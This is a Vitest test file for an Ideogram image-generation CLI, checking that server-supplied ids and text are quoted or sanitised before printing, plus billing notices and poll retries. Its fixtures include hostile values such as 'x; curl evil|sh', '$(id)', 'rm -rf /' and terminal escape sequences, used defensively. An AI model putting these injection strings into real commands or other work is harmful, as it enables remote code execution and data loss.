/**
 * Core pre-release fixes after ship run #21: what a user is told after money may
 * have moved. Printed shell commands, server text on success paths, the
 * describeError regression, the billing line on --async --wait, recovery after a
 * paid generation, poll retries, and small items. Each behaviour test fails
 * against 62d0515.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

vi.mock('dns/promises', () => ({
  lookup: vi.fn(async () => ({ address: '8.8.8.8', family: 4 })),
}));

import { fetchMock, fakeResponse, resetHttp, instantSleeps } from './helpers/http.js';
import { IdeogramAPI, IdeogramAPIError, BILLING_NOTE } from '../src/api.js';
import { sanitizeServerText, serverText } from '../src/http.js';
import { normalizeLogLevel } from '../src/logger.js';
import {
  executeV2,
  executeAsyncV2,
  executeGetGeneration,
  reportCommandError,
  getGenerationCommand,
  describeError,
  shouldAppendBillingNote,
} from '../src/cli-v2.js';
import { createProgram } from '../src/program.js';

const KEY = 'test-key-1234567890';
const PLACEHOLDER = 'ideogram get-generation <generation-id> --wait';
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
/** A decodable 1x1 (square) PNG. */
const SQUARE_PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'base64'
);

class ExitSignal extends Error {
  constructor(code) {
    super(`process.exit(${code})`);
    this.code = code;
  }
}

let work;
let logs;
let errors;
let stdout;
let spies = [];
const err = () => errors.join('\n');
const out = () => logs.join('\n');
const everything = () => [...logs, ...errors, ...stdout].join('\n');
const global = () => ({ apiKey: KEY, outputDir: join(work, 'out'), logLevel: 'error' });
const api = (level = 'error') => new IdeogramAPI(KEY, undefined, level);
const caught = (p) => p.catch((e) => e);
// Any control character but LF, any bidi/format character, or a C1 CSI/OSC introducer.
const RAW = /[\u0000-\u0009\u000b-\u001f\u007f-\u009f\u200b-\u200f\u2028\u2029\u202a-\u202e\u2060-\u2069\u061c\ufeff]/;
// Terminal escapes and bidi marks, for output that legitimately carries \r (the spinner) or \n.
const HOSTILE = /[\u001b\u0007\u009b\u009d\u200b-\u200f\u2028\u2029\u202a-\u202e\u2060-\u2069\u061c\ufeff]/;

beforeEach(() => {
  resetHttp();
  work = mkdtempSync(join(tmpdir(), 'ideogram-core-'));
  logs = [];
  errors = [];
  stdout = [];
  spies = [
    vi.spyOn(console, 'log').mockImplementation((...a) => void logs.push(a.join(' '))),
    vi.spyOn(console, 'error').mockImplementation((...a) => void errors.push(a.join(' '))),
    vi.spyOn(process.stdout, 'write').mockImplementation((s) => (stdout.push(String(s)), true)),
    vi.spyOn(process, 'exit').mockImplementation((code) => {
      throw new ExitSignal(code);
    }),
  ];
});

afterEach(() => {
  spies.forEach((s) => s.mockRestore());
  rmSync(work, { recursive: true, force: true });
});

async function run(...args) {
  const program = createProgram();
  const apply = (c) => {
    c.exitOverride();
    c.configureOutput({ writeOut: (s) => logs.push(s), writeErr: (s) => errors.push(s) });
    c.commands.forEach(apply);
  };
  apply(program);
  try {
    await program.parseAsync(['node', 'ideogram', '--api-key', KEY, '-o', work, ...args]);
    return {};
  } catch (e) {
    if (e instanceof ExitSignal) return { exit: e.code };
    if (e?.name === 'CommanderError') return { error: e };
    throw e;
  }
}

const exited = (p) => caught(p).then((e) => (e instanceof ExitSignal ? e : Promise.reject(e)));

// ------------------------------------------------------------------ 1. ids in printed commands
describe('item 1: a server id never reaches a pasteable command unquoted', () => {
  it.each([
    ['a command separator', 'x; curl evil|sh'],
    ['command substitution', '$(id)'],
    ['a backtick', '`id`'],
    ['a space', 'a b'],
    ['a newline', 'abc\nrm -rf /'],
    ['an empty string', ''],
    ['129 characters', 'a'.repeat(129)],
    ['a quote', "a'b"],
  ])('%s gives the placeholder command', (_name, id) => {
    expect(getGenerationCommand(id)).toBe(PLACEHOLDER);
  });

  it('a normal id and a "-"-leading id are unchanged', () => {
    expect(getGenerationCommand('Abc_123-x')).toBe('ideogram get-generation Abc_123-x --wait');
    expect(getGenerationCommand('-uaWvHfERk65rkfjaocs9w')).toBe('ideogram get-generation --wait -- -uaWvHfERk65rkfjaocs9w');
    expect(getGenerationCommand('a'.repeat(128))).toBe(`ideogram get-generation ${'a'.repeat(128)} --wait`);
  });

  it('the submit path prints the placeholder, then the id on its own line, sanitized', async () => {
    fetchMock.mockResolvedValue(fakeResponse(200, { generation_id: 'x; curl evil|sh\u001b]0;t\u0007' }));
    await executeAsyncV2('generate-svg', { prompt: 'p' }, global());
    expect(logs).toContain(`Check on it with: ${PLACEHOLDER}`);
    expect(logs).toContain('  Generation id: x; curl evil|sh');
    expect(out()).not.toMatch(/get-generation x;/);
    expect(everything()).not.toMatch(HOSTILE);
  });

  it('the resume hint after a failed poll does the same', () => {
    reportCommandError(
      new IdeogramAPIError('poll failed', { generationId: '$(id)', possiblyBilled: true, resumable: true, status: 503 })
    );
    expect(err()).toContain(`Resume with: ${PLACEHOLDER}`);
    expect(err()).toContain('Generation id: $(id)');
    expect(err()).not.toContain('get-generation $(id)');
  });
});

// ------------------------------------------------------------------ 2. server text on success paths
describe('item 2: server text is sanitized on success paths', () => {
  it('sanitizeServerText strips C1 CSI and OSC, bidi and format characters', () => {
    expect(sanitizeServerText('a\u009b31mb')).toBe('ab');
    expect(sanitizeServerText('a\u009d0;title\u0007b')).toBe('ab');
    expect(sanitizeServerText('a\u009d0;title\u009cb')).toBe('ab');
    expect(sanitizeServerText('a\u009b b')).toBe('a b'); // a lone introducer does not eat the next letter
    for (const ch of ['\u200b', '\u200f', '\u2028', '\u2029', '\u202a', '\u202e', '\u2060', '\u2069', '\u061c', '\ufeff']) {
      expect(sanitizeServerText(`a${ch}b`)).toBe('ab');
    }
  });

  it.each([
    ['DEL', '\u007f'],
    ['VT', '\u000b'],
    ['FF', '\u000c'],
  ])('sanitizeServerText strips %s', (_n, ch) => {
    expect(sanitizeServerText(`a${ch}b`)).toBe('ab');
  });

  it('the boundaries of the controls it keeps and drops', () => {
    expect(sanitizeServerText('a\tb')).toBe('a\tb');
    expect(sanitizeServerText('a\u0008b')).toBe('ab');
    expect(sanitizeServerText('a\u001fb')).toBe('ab');
    expect(sanitizeServerText('a b')).toBe('a b');
    expect(sanitizeServerText('a b')).toBe('a b');
  });

  it('serverText prints numbers through String() and sanitizes everything else', () => {
    expect(serverText(12)).toBe('12');
    expect(serverText(NaN)).toBe('NaN');
    expect(serverText('a\u001b[31mb')).toBe('ab');
    expect(serverText({ toString: () => 'x\u202ey' })).toBe('xy');
  });

  it('get-generation: generation_id, status and created never print raw', async () => {
    fetchMock.mockResolvedValue(
      fakeResponse(200, {
        generation_id: 'g\u001b]0;owned\u0007\u202e1',
        status: 'pending\u001b[31m',
        created: '2026\u009b31m-11',
      })
    );
    await executeGetGeneration('g1', {}, global());
    const line = logs.find((l) => l.includes('Generation g'));
    expect(line).toBe('\nGeneration g1: pending (created 2026-11)');
    expect(everything()).not.toMatch(HOSTILE);
  });

  it('result URLs and the object kind never print raw (v2)', async () => {
    fetchMock.mockResolvedValue(
      fakeResponse(200, {
        generation_id: 'g1',
        status: 'completed',
        created: 't',
        data: [
          { object_type: 'audio\u001b[31m.generation', url: 'https://ideogram.ai/a\u202e.png\u001b]0;x\u0007' },
        ],
      })
    );
    await executeGetGeneration('g1', {}, global());
    expect(out()).toContain('Result URL 1/1: https://ideogram.ai/a.png');
    expect(out()).toContain('Item 1/1 is a audio.generation; not downloaded');
    expect(everything()).not.toMatch(HOSTILE);
  });

  it('"Generation accepted" prints a sanitized id', async () => {
    fetchMock.mockResolvedValue(fakeResponse(200, { generation_id: 'g\u001b[31m1\u202e' }));
    await executeV2('generate-v46', { prompt: 'p', async: true }, global());
    expect(logs).toContain('Generation accepted: g1');
    expect(everything()).not.toMatch(HOSTILE);
  });

  it('the spinner status of a poll never carries a terminal escape', async () => {
    const desc = Object.getOwnPropertyDescriptor(process.stdout, 'isTTY');
    Object.defineProperty(process.stdout, 'isTTY', { value: true, configurable: true });
    try {
      let n = 0;
      fetchMock.mockImplementation(() =>
        Promise.resolve(
          n++ === 0
            ? fakeResponse(200, { generation_id: 'g1', status: 'pending\u001b]0;pwn\u0007\u202e', created: 't' })
            : fakeResponse(200, { generation_id: 'g1', status: 'completed', created: 't', data: [] })
        )
      );
      await executeGetGeneration('g1', { wait: true, pollInterval: '300' }, global()).catch(() => {});
    } finally {
      if (desc) Object.defineProperty(process.stdout, 'isTTY', desc);
      else delete process.stdout.isTTY;
    }
    const frames = stdout.join('');
    expect(frames).toContain('Generation g1: pending');
    // The spinner's own \x1b[K is not used when a message is given; nothing from the server survives.
    expect(frames).not.toMatch(/[\u001b\u0007\u009b\u009d\u202e]/);
  });

  it('a dry-run quote prints billing fields sanitized', async () => {
    fetchMock.mockResolvedValue(
      fakeResponse(200, {
        object: 'price_quote',
        quantity: 2,
        billing_identifier: 'img\u001b[31m_v4\u202e',
        usd_micros: 40000,
        credit_millis: 4000,
        qualifier: 'exact\u009d0;x\u0007',
      })
    );
    await executeV2('generate-v46', { prompt: 'p', dryRun: true }, global());
    expect(out()).toContain('Billing:  2 x img_v4');
    expect(out()).toContain('Qualifier: exact');
    expect(everything()).not.toMatch(HOSTILE);
  });

  it('describe prints a sanitized description', async () => {
    const img = join(work, 'in.png');
    writeFileSync(img, PNG);
    fetchMock.mockResolvedValue(fakeResponse(200, { descriptions: [{ text: 'a fox\u001b[2J\u202e in snow\u009d0;t\u0007' }] }));
    await run('describe', '-i', img);
    expect(out()).toContain('1. a fox in snow');
    expect(everything()).not.toMatch(HOSTILE);
  });

  it('v1 result URLs print sanitized', async () => {
    fetchMock.mockImplementation((url) =>
      Promise.resolve(
        String(url).includes('api.ideogram.ai')
          ? fakeResponse(200, { created: 't', data: [{ url: 'https://ideogram.ai/x\u202e.png\u001b[31m' }] })
          : fakeResponse(403, {})
      )
    );
    await run('generate', '-p', 'a red fox');
    expect(out()).toContain('Result URL 1/1: https://ideogram.ai/x.png');
    expect(everything()).not.toMatch(HOSTILE);
  });

  it('a library log line about a dry-run quote carries no escape', async () => {
    const client = api('info');
    const info = vi.spyOn(client.logger, 'info');
    fetchMock.mockResolvedValue(
      fakeResponse(200, { object: 'price_quote', quantity: 1, billing_identifier: 'a\u001b[31mb', usd_micros: 1, credit_millis: 1, qualifier: 'q\u202e' })
    );
    await client.generateV46({ prompt: 'p', dryRun: true });
    const joined = info.mock.calls.map((c) => c[0]).join('\n');
    expect(joined).toContain('dry run: 1 x ab');
    expect(joined).not.toMatch(HOSTILE);
  });

  it('a hostile Content-Type is not echoed raw in the message or the log', async () => {
    const client = api('warn');
    const warn = vi.spyOn(client.logger, 'warn');
    let e;
    {
      fetchMock.mockResolvedValue({
        ok: true,
        status: 200,
        headers: { get: (k) => (k.toLowerCase() === 'content-type' ? 'text/html\u001b]0;pwn\u0007\u202e' : null) },
        get body() {
          return new Response('<html>').body;
        },
      });
      e = await caught(client.generateV46({ prompt: 'p' }));
    }
    expect(e).toBeInstanceOf(IdeogramAPIError);
    expect(e.message).toContain('Content-Type: text/html)');
    expect(e.message).not.toMatch(HOSTILE);
    const logged = warn.mock.calls.map((c) => c[0]).join('\n');
    expect(logged).toContain('Unexpected Content-Type in response: text/html');
    expect(logged).not.toMatch(HOSTILE);
  });
});

// ------------------------------------------------------------------ 3. describeError keeps its lines
describe('item 3: describeError keeps LF', () => {
  it('keeps the newlines of a multi-line message', () => {
    expect(describeError(new Error('first\nsecond\n\nthird'))).toBe('first\nsecond\n\nthird');
  });
  it('still strips an ESC, collapses a lone CR and turns CRLF into LF', () => {
    expect(describeError(new Error('a\u001b[31mb\nc\rd\r\ne'))).toBe('ab\nc d\ne');
  });
  it('sanitizeServerText({ keepNewlines }) keeps LF and strips the rest', () => {
    expect(sanitizeServerText('a\n\u001b]0;t\u0007b\u202e\u0000c', { keepNewlines: true })).toBe('a\nbc');
    expect(sanitizeServerText('a\nb')).toBe('a b');
  });

  it('the missing-key error printed by the CLI keeps its lines', async () => {
    const saved = process.env.IDEOGRAM_API_KEY;
    delete process.env.IDEOGRAM_API_KEY;
    try {
      await exited(executeV2('generate-v46', { prompt: 'p' }, { outputDir: join(work, 'out'), logLevel: 'error' }));
    } finally {
      if (saved !== undefined) process.env.IDEOGRAM_API_KEY = saved;
    }
    const lines = err().split('\n');
    expect(lines).toContain('  1. CLI flag:           ideogram --api-key YOUR_KEY generate --prompt "..."');
    expect(lines).toContain('Get your API key at https://ideogram.ai/api');
    expect(lines.length).toBeGreaterThan(8);
  });
});

// ------------------------------------------------------------------ 4. billing line on --async --wait
describe('item 4: a wait this command started carries the billing line', () => {
  const submitThenFail = (status) =>
    fetchMock.mockImplementation((url) =>
      Promise.resolve(
        String(url).includes('/generations/') ? fakeResponse(status, { error: 'gone' }) : fakeResponse(200, { generation_id: 'gen-s' })
      )
    );

  it('shouldAppendBillingNote: true for a 404 only when the wait was ours', () => {
    const e = { message: 'x', status: 404, resumable: false, possiblyBilled: true, generationId: 'g' };
    expect(shouldAppendBillingNote(e)).toBe(false);
    expect(shouldAppendBillingNote(e, { submittedHere: true })).toBe(true);
    expect(shouldAppendBillingNote({ ...e, possiblyBilled: false }, { submittedHere: true })).toBe(false);
  });

  it.each([400, 404, 410, 422])('generate-svg --wait, then a %i poll: says it was submitted and may be billed', async (status) => {
    submitThenFail(status);
    const res = await exited(executeAsyncV2('generate-svg', { prompt: 'p', wait: true, pollInterval: '1' }, global()));
    expect(res.code).toBe(1);
    expect(err()).toContain('This command submitted the generation, so it may have been billed. Check your usage before retrying.');
  });

  it('executeV2 --async --wait, then a 404 poll, says the same', async () => {
    submitThenFail(404);
    await exited(executeV2('generate-v46', { prompt: 'p', async: true, wait: true, pollInterval: '1' }, global()));
    expect(err()).toContain('This command submitted the generation, so it may have been billed.');
  });

  it('a direct get-generation 404 keeps today\'s behaviour: no billing line', async () => {
    fetchMock.mockResolvedValue(fakeResponse(404, { error: 'gone' }));
    await exited(executeGetGeneration('gen-x', { wait: true, pollInterval: '1' }, global()));
    expect(err()).not.toContain(BILLING_NOTE);
    expect(err()).not.toContain('This command submitted');
  });
});

// ------------------------------------------------------------------ 5. recovery after a paid generation
describe('item 5a: the check-on-it command is printed at submission, with and without --wait', () => {
  it('without --wait (unchanged)', async () => {
    fetchMock.mockResolvedValue(fakeResponse(200, { generation_id: 'gen-a' }));
    await executeAsyncV2('generate-svg', { prompt: 'p' }, global());
    expect(logs).toContain('Check on it with: ideogram get-generation gen-a --wait');
  });

  it.each(['generate-svg', 'generate-v46'])('with --wait, before the first poll (%s)', async (op) => {
    let printedBeforePoll = false;
    fetchMock.mockImplementation((url) => {
      if (String(url).includes('/generations/')) {
        printedBeforePoll = logs.includes('Check on it with: ideogram get-generation gen-a --wait');
        return Promise.resolve(fakeResponse(200, { generation_id: 'gen-a', status: 'completed', created: 't', data: [] }));
      }
      return Promise.resolve(fakeResponse(200, { generation_id: 'gen-a' }));
    });
    const opts = { prompt: 'p', wait: true, pollInterval: '1', ...(op === 'generate-v46' ? { async: true } : {}) };
    const run_ = op === 'generate-svg' ? executeAsyncV2 : executeV2;
    await caught(run_(op, opts, global()));
    expect(printedBeforePoll).toBe(true);
  });
});

describe('item 5b: a download failure after a paid generation says so', () => {
  it('get-generation: fetching again is not billed, so it says to run the command again', async () => {
    fetchMock.mockImplementation((url) =>
      Promise.resolve(
        String(url).includes('/generations/')
          ? fakeResponse(200, { generation_id: 'gen-d', status: 'completed', created: 't', data: [{ url: 'https://ideogram.ai/x.png' }] })
          : fakeResponse(403, {})
      )
    );
    await exited(executeGetGeneration('gen-d', {}, global()));
    expect(err()).toContain('Fetching a result again is not billed: run the command again.');
    expect(err()).not.toContain('do not run the command again');
    expect(err()).toContain('Fetch the result again with: ideogram get-generation gen-d --wait');
  });

  it('a submit with an id: completed and billed, do not re-run, and the get-generation command', async () => {
    fetchMock.mockImplementation((url) =>
      Promise.resolve(
        String(url).includes('/v2/')
          ? fakeResponse(200, { generation_id: 'gen-s', data: [{ url: 'https://ideogram.ai/x.png' }] })
          : fakeResponse(403, {})
      )
    );
    await exited(executeV2('generate-v46', { prompt: 'p' }, global()));
    expect(err()).toContain('The generation completed and was billed: do not run the command again.');
    expect(err()).toContain('Fetch the result again with: ideogram get-generation gen-s --wait');
  });

  it('v2 without an id: the URLs are in the metadata file and may expire', async () => {
    fetchMock.mockImplementation((url) =>
      Promise.resolve(
        String(url).includes('/v2/')
          ? fakeResponse(200, { data: [{ url: 'https://ideogram.ai/x.png' }] })
          : fakeResponse(403, {})
      )
    );
    await exited(executeV2('generate-v46', { prompt: 'p' }, global()));
    expect(err()).toContain('do not run the command again');
    expect(err()).toMatch(/result URLs are in .*\.json and may expire/);
    expect(err()).not.toContain('Fetch the result again');
  });

  it('v1 (no id): billed, do not re-run, the URLs are in the metadata file and may expire', async () => {
    fetchMock.mockImplementation((url) =>
      Promise.resolve(
        String(url).includes('api.ideogram.ai')
          ? fakeResponse(200, { created: 't', data: [{ url: 'https://ideogram.ai/x.png' }] })
          : fakeResponse(403, {})
      )
    );
    const res = await run('generate', '-p', 'a red fox');
    expect(res.exit).toBe(1);
    expect(err()).toContain('The images were generated and billed: do not run the command again.');
    expect(err()).toMatch(/result URLs are in .*\.json and may expire/);
  });
});

describe('item 5c: v1 numImages', () => {
  it('an explicit 0 is refused before any request (it used to become a billed 1)', async () => {
    const e = await caught(api().generate({ prompt: 'p', numImages: 0 }));
    expect(e.message).toMatch(/numImages must be an integer between 1 and 8/);
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it.each([9, -1, 1.5, NaN])('%s is refused', async (n) => {
    for (const method of ['generate', 'remix', 'reframe', 'replaceBackground', 'edit']) {
      const e = await caught(api()[method]({ prompt: 'p', image: SQUARE_PNG, mask: SQUARE_PNG, resolution: '1024x1024', numImages: n }));
      expect(e.message).toMatch(/numImages must be an integer between 1 and 8/);
    }
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('unset sends 1, and 8 is allowed', async () => {
    fetchMock.mockResolvedValue(fakeResponse(200, { created: 't', data: [] }));
    await api().generate({ prompt: 'p' });
    await api().generate({ prompt: 'p', numImages: 8 });
    const bodies = fetchMock.mock.calls.map((c) => c[1].body.get('num_images'));
    expect(bodies).toEqual(['1', '8']);
  });

  it.each([
    ['edit', ['-p', 'a red fox', '-i', 'in.png', '-m', 'in.png']],
    ['remix', ['-p', 'a red fox', '-i', 'in.png']],
    ['reframe', ['-i', 'in.png', '-r', '1024x1024']],
    ['replace-background', ['-p', 'a red fox', '-i', 'in.png']],
  ])('the v1 %s command refuses --num-images 0 and 9', async (cmd, extra) => {
    writeFileSync(join(work, 'in.png'), SQUARE_PNG);
    const args = extra.map((a) => (a === 'in.png' ? join(work, 'in.png') : a));
    for (const n of ['0', '9']) {
      errors.length = 0;
      const res = await run(cmd, ...args, '--num-images', n);
      expect(res.exit).toBe(1);
      expect(err()).toContain('--num-images must be at');
    }
    expect(fetchMock).not.toHaveBeenCalled();
  });
});

describe('item 5d: v1 batch generate validates every prompt before the first request', () => {
  it('a later invalid prompt is refused before anything is billed', async () => {
    fetchMock.mockResolvedValue(fakeResponse(200, { created: 't', data: [] }));
    const res = await run('generate', '-p', 'a red fox', `${'word '.repeat(2100)}`);
    expect(res.exit).toBe(1);
    expect(err()).toMatch(/maximum length/);
    expect(fetchMock).not.toHaveBeenCalled();
  });
});

// ------------------------------------------------------------------ 6. poll retries
describe('item 6: waitForGeneration retries a resumable poll failure', () => {
  const done = { generation_id: 'g', status: 'completed', created: 't', data: [] };
  const pending = { generation_id: 'g', status: 'pending', created: 't' };

  it('two 503s then success completes, with the 429 backoff', async () => {
    const sleeps = instantSleeps();
    fetchMock
      .mockResolvedValueOnce(fakeResponse(503, { error: 'down' }))
      .mockResolvedValueOnce(fakeResponse(503, { error: 'down' }))
      .mockResolvedValueOnce(fakeResponse(200, done));
    const r = await api().waitForGeneration('g', { intervalMs: 1 });
    expect(r.status).toBe('completed');
    expect(fetchMock).toHaveBeenCalledTimes(3);
    expect(sleeps).toEqual([1000, 2000]);
  });

  it.each([[500], [502], [408], [425]])('HTTP %i is retried', async (status) => {
    instantSleeps();
    fetchMock.mockResolvedValueOnce(fakeResponse(status, { error: 'x' })).mockResolvedValueOnce(fakeResponse(200, done));
    expect((await api().waitForGeneration('g', { intervalMs: 1 })).status).toBe('completed');
  });

  it('a network reset is retried', async () => {
    instantSleeps();
    fetchMock
      .mockRejectedValueOnce(Object.assign(new TypeError('fetch failed'), { cause: { code: 'ECONNRESET' } }))
      .mockResolvedValueOnce(fakeResponse(200, done));
    expect((await api().waitForGeneration('g', { intervalMs: 1 })).status).toBe('completed');
  });

  it('5 consecutive resets throw, resumable, with the id (backoff 1, 2, 4, 8 s)', async () => {
    const sleeps = instantSleeps();
    fetchMock.mockRejectedValue(Object.assign(new TypeError('fetch failed'), { cause: { code: 'ECONNRESET' } }));
    const e = await caught(api().waitForGeneration('g', { intervalMs: 1 }));
    expect(e).toBeInstanceOf(IdeogramAPIError);
    expect(e.resumable).toBe(true);
    expect(e.possiblyBilled).toBe(true);
    expect(e.generationId).toBe('g');
    expect(e.code).toBe('ECONNRESET');
    expect(fetchMock).toHaveBeenCalledTimes(5);
    expect(sleeps).toEqual([1000, 2000, 4000, 8000]);
  });

  it('a good poll resets the count', async () => {
    instantSleeps();
    const fail = () => fetchMock.mockResolvedValueOnce(fakeResponse(503, { error: 'x' }));
    for (let i = 0; i < 4; i++) fail();
    fetchMock.mockResolvedValueOnce(fakeResponse(200, pending));
    for (let i = 0; i < 4; i++) fail();
    fetchMock.mockResolvedValueOnce(fakeResponse(200, done));
    expect((await api().waitForGeneration('g', { intervalMs: 1 })).status).toBe('completed');
    expect(fetchMock).toHaveBeenCalledTimes(10);
  });

  it('a 404 throws at once', async () => {
    instantSleeps();
    fetchMock.mockResolvedValue(fakeResponse(404, { error: 'gone' }));
    const e = await caught(api().waitForGeneration('g', { intervalMs: 1 }));
    expect(e.status).toBe(404);
    expect(e.resumable).toBe(false);
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });

  it.each([400, 401, 403, 410, 422, 402, 418])('HTTP %i is not retried', async (status) => {
    instantSleeps();
    fetchMock.mockResolvedValue(fakeResponse(status, { error: 'x', message: 'x' }));
    await caught(api().waitForGeneration('g', { intervalMs: 1 }));
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });

  it('an onPoll that throws ends the wait (no retry of a caller exception)', async () => {
    instantSleeps();
    fetchMock.mockResolvedValue(fakeResponse(200, pending));
    const e = await caught(
      api().waitForGeneration('g', {
        intervalMs: 1,
        onPoll: () => {
          throw new Error('cb');
        },
      })
    );
    expect(e.message).toContain('onPoll callback threw');
    expect(e.resumable).toBe(true);
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });

  it('the deadline is respected: no retry that would sleep past it', async () => {
    fetchMock.mockResolvedValue(fakeResponse(503, { error: 'down' }));
    const started = Date.now();
    const e = await caught(api().waitForGeneration('g', { intervalMs: 5, timeoutMs: 50 }));
    expect(e.message).toMatch(/Timed out after 50ms/);
    expect(e.resumable).toBe(true);
    expect(e.generationId).toBe('g');
    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(Date.now() - started).toBeLessThan(900);
  });

  it('each retry is logged at warn', async () => {
    instantSleeps();
    const client = api('warn');
    const warn = vi.spyOn(client.logger, 'warn');
    fetchMock.mockResolvedValueOnce(fakeResponse(503, { error: 'x' })).mockResolvedValueOnce(fakeResponse(200, done));
    await client.waitForGeneration('g', { intervalMs: 1 });
    expect(warn.mock.calls.map((c) => c[0])).toEqual(['Poll of g failed (503): retrying in 1000ms (failure 1/5)']);
  });
});

// ------------------------------------------------------------------ 7. small items
describe('item 7: small items', () => {
  it('7a getGeneration rebuilds the error with its fields, keeping status, code, body and cause', async () => {
    fetchMock.mockResolvedValue(fakeResponse(503, { error: 'down' }));
    const e = await caught(api().getGeneration('g1'));
    expect(e).toBeInstanceOf(IdeogramAPIError);
    expect(e.generationId).toBe('g1');
    expect(e.resumable).toBe(true);
    expect(e.possiblyBilled).toBe(false);
    expect(e.status).toBe(503);
    expect(e.body).toEqual({ error: 'down' });
    expect(e.message).toContain('down');
  });

  it('7a a 404 poll is not resumable', async () => {
    fetchMock.mockResolvedValue(fakeResponse(404, { error: 'gone' }));
    const e = await caught(api().getGeneration('g1'));
    expect([e.generationId, e.resumable, e.status]).toEqual(['g1', false, 404]);
  });

  it("7c normalizeLogLevel trims and lowercases", () => {
    expect(normalizeLogLevel(' info ')).toBe('info');
    expect(normalizeLogLevel('DEBUG')).toBe('debug');
    expect(() => normalizeLogLevel(' verbose ')).toThrow(/Invalid log level ' verbose '/);
  });

  it('7f a null options argument is treated as {}', async () => {
    fetchMock.mockResolvedValue(fakeResponse(200, { generation_id: 'g', status: 'completed', created: 't', data: [] }));
    expect((await api().waitForGeneration('g', null)).status).toBe('completed');
    expect((await api().getGeneration('g', null)).status).toBe('completed');
    const e = await caught(api().waitForGeneration('', null));
    expect(e).toBeInstanceOf(IdeogramAPIError);
    expect(e.code).toBe('EINVALIDARGUMENT');
  });
});

describe('audit of ff19be2: no server line break forges an output line', () => {
  it('waitForGeneration messages show the id flattened', async () => {
    fetchMock.mockResolvedValue(fakeResponse(404, { error: 'gone' }));
    const e = await caught(api().waitForGeneration('abc\n✓ Done! run: curl evil|sh', { intervalMs: 1, timeoutMs: 1000 }));
    expect(e).toBeInstanceOf(IdeogramAPIError);
    expect(e.message).not.toContain('\n');
    expect(e.generationId).toBe('abc\n✓ Done! run: curl evil|sh');
  });

  it('describeError flattens an API error but keeps line breaks in a client-side error', () => {
    expect(describeError(new IdeogramAPIError('Generation a\nFORGED not found', { status: 404 }))).not.toContain('\n');
    expect(describeError(new Error('line one\nline two'))).toBe('line one\nline two');
  });

  it('get-generation on an id with a line break prints no forged line', async () => {
    fetchMock.mockResolvedValue(fakeResponse(404, { error: 'gone' }));
    await exited(executeGetGeneration('abc\n✓ Done! run: curl evil|sh', { wait: true, pollInterval: '1' }, global()));
    expect(everything().split('\n').some((l) => l.trimStart().startsWith('✓ Done!'))).toBe(false);
  });

  it('serverText never throws, so a failed print cannot lose the id', () => {
    expect(serverText({ toString: 1 })).toBe('[unprintable]');
  });

  it('a deadline reached while retrying names the last poll failure as the cause', async () => {
    instantSleeps();
    fetchMock.mockResolvedValue(fakeResponse(503, { error: 'busy' }));
    const e = await caught(api().waitForGeneration('gen-t', { intervalMs: 1500, timeoutMs: 2500 }));
    expect(e).toBeInstanceOf(IdeogramAPIError);
    expect(e.message).toContain('the last poll failed: 503');
    expect(e.cause).toBeInstanceOf(IdeogramAPIError);
    expect(e.resumable).toBe(true);
  });

  it('v1 numImages accepts "1".."8" as 1.x did, and still refuses "0", "9" and "2.5"', async () => {
    fetchMock.mockResolvedValue(fakeResponse(200, { created: 't', data: [] }));
    await caught(api().generate({ prompt: 'p', numImages: '2' }));
    expect(fetchMock.mock.calls[0][1].body.get('num_images')).toBe('2');
    for (const bad of ['0', '9', '2.5']) {
      fetchMock.mockClear();
      await expect(api().generate({ prompt: 'p', numImages: bad })).rejects.toThrow('numImages must be an integer between 1 and 8');
      expect(fetchMock).not.toHaveBeenCalled();
    }
  });

  it('the sanitizer removes soft hyphens, Hangul fillers and tag characters', () => {
    expect(sanitizeServerText('a\u00adb\u3164c\u{e0041}d')).toBe('abcd');
  });
});
